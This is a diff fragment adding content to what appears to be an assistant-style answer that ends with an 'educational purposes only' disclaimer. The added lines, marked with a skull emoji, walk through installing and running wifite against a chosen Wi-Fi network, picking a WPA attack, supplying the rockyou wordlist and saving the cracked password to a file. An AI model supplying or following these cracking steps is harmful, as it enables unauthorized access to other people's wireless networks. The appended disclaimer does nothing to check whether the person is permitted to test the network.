@@ -189,3 +189,26 @@ Here are the steps:
 Remember, these steps are for educational purposes only and should only be performed on networks for which you have explicit permission to test.
 
 If you encounter any issues or need further assistance, feel free to ask!
+
+----
+📌💀
+
+Here is a step-by-step example:
+# Update package list and install wifite
+sudo apt update
+sudo apt install wifite
+
+# Run wifite
+sudo wifite
+
+# Inside wifite, select the target network and attack method
+# For example, if the target network is number 1 and you choose WPA attack:
+# 1
+# 2 (for WPA attack)
+
+# If you need to specify a wordlist, you can do so when prompted
+# For example, if the wordlist is /usr/share/wordlists/rockyou.txt:
+# /usr/share/wordlists/rockyou.txt
+
+# To store the password in a text file, redirect the output:
+sudo wifite | tee cracked_password.txt
